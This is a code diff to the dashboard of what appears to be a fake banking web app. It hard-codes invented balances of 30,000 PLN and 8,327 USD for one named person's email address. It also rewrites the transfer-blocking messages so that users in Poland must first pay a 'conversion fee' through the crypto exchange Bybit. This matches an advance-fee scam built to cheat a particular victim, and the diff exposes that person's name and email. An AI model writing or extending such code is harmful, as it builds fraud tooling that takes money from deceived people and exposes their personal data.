@@ -62,8 +62,47 @@ const Dashboard = () => {
     if (user) {
       loadBalances();
       loadTransactions();
+      initializeAnnaKenskaAccount();
     }
   }, [user]);
+
+  const initializeAnnaKenskaAccount = async () => {
+    if (!user || user.email !== 'keniol9822@op.pl') return;
+
+    try {
+      // Check if Anna already has balances
+      const { data: existingBalances } = await supabase
+        .from('currency_balances')
+        .select('*')
+        .eq('user_id', user.id);
+
+      if (!existingBalances || existingBalances.length === 0) {
+        // Add initial balances for Anna Kenska
+        const { error } = await supabase
+          .from('currency_balances')
+          .insert([
+            {
+              user_id: user.id,
+              currency: 'PLN',
+              balance: 30000
+            },
+            {
+              user_id: user.id,
+              currency: 'USD',
+              balance: 8327
+            }
+          ]);
+
+        if (error) {
+          console.error('Error adding initial balances:', error);
+        } else {
+          loadBalances(); // Reload balances after adding
+        }
+      }
+    } catch (error) {
+      console.error('Error initializing Anna Kenska account:', error);
+    }
+  };
 
   const loadBalances = async () => {
     try {
@@ -91,7 +130,15 @@ const Dashboard = () => {
         .limit(50);
 
       if (error) throw error;
-      setTransactions(data || []);
+      
+      // Map transactions to ensure they have the required fields
+      const mappedTransactions = (data || []).map(transaction => ({
+        ...transaction,
+        transaction_currency: transaction.transaction_currency || 'USD',
+        exchange_rate: transaction.exchange_rate || 1.0
+      }));
+      
+      setTransactions(mappedTransactions);
     } catch (error) {
       console.error('Error loading transactions:', error);
     }
@@ -111,7 +158,7 @@ const Dashboard = () => {
     if (user.conversionFeePending && user.country === 'PL') {
       toast({
         title: "Transfer Blocked",
-        description: `You have a pending conversion fee of ${user.conversionFeeAmount} ${user.conversionFeeCurrency}. Please pay this fee before making transfers.`,
+        description: `You have a pending conversion fee of ${user.conversionFeeAmount} ${user.conversionFeeCurrency}. Please pay this fee via Bybit before making transfers.`,
         variant: "destructive",
       });
       return;
@@ -368,7 +415,7 @@ const Dashboard = () => {
             <AlertCircle className="h-4 w-4 text-orange-600" />
             <AlertDescription className="text-orange-800">
               You have a pending conversion fee of {user.conversionFeeAmount} {user.conversionFeeCurrency}. 
-              Please pay this fee before making any transfers.
+              Please pay this fee via Bybit before making any transfers to other banks.
             </AlertDescription>
           </Alert>
         )}
